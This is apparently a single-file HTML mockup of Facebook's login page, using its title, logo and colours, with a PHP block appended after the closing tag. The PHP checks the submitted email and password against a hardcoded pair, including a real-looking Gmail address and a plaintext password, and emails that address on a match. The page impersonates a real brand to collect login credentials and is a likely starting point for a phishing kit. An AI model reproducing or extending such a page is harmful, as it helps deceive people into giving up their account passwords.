<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login | Facebook</title>
    <style>
        /* Reset styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            width: 350px;
            padding: 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        .logo {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 20px;
        }
        .logo img {
            width: 50px;
            height: auto;
            margin-right: 10px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            font-weight: bold;
            margin-bottom: 5px;
            display: block;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #dddfe2;
            border-radius: 5px;
            outline: none;
        }
        .form-group input:focus {
            border-color: #1877f2;
        }
        .form-group button {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            border: none;
            border-radius: 5px;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
        }
        .form-group button:hover {
            background-color: #166fe5;
        }
        .create-account {
            text-align: center;
            margin-top: 20px;
        }
        .create-account a {
            color: #1877f2;
            text-decoration: none;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/1200px-Facebook_f_logo_%282019%29.svg.png" alt="Facebook Logo">
            <h1>Facebook</h1>
        </div>
        <form action="#" method="POST">
            <div class="form-group">
                <label for="email">Email address or phone number:</label>
                <input type="text" id="email" name="email" required>
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <div class="form-group">
                <button type="submit">Log In</button>
            </div>
        </form>
        <div class="create-account">
            <a href="#">Create New Account</a> | <a href="#">Forgot Password?</a>
        </div>
    </div>
</body>
</html>
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // استقبال بيانات المستخدم
    $email = $_POST['email'];
    $password = $_POST['password'];

    // هنا يمكنك إجراء التحقق من بيانات المستخدم، مثلاً بالتحقق من قاعدة البيانات
    // سنقوم هنا بمحاكاة عملية تسجيل الدخول باستخدام معلومات مستخدم صفحة تجريبية
    $valid_email = "mohmmedelnagm2005@gmail.com";
    $valid_password = "password123";

    if ($email === $valid_email && $password === $valid_password) {
        // تحضير رسالة البريد الإلكتروني
        $to = "mohmmedelnagm2005@gmail.com";
        $subject = "تسجيل دخول ناجح";
        $message = "تم تسجيل الدخول بنجاح باستخدام البريد الإلكتروني: " . $email;
        $headers = "From: your_email@example.com" . "\r\n";

        // إرسال رسالة البريد الإلكتروني
        mail($to, $subject, $message, $headers);

        // تحويل المستخدم إلى صفحة نجاح الدخول
        header("Location: success.php");
        exit();
    } else {
        // عرض رسالة خطأ إذا كانت بيانات المستخدم غير صحيحة
        echo "<p style='color: red; text-align: center;'>Invalid email or password. Please try again.</p>";
    }
}

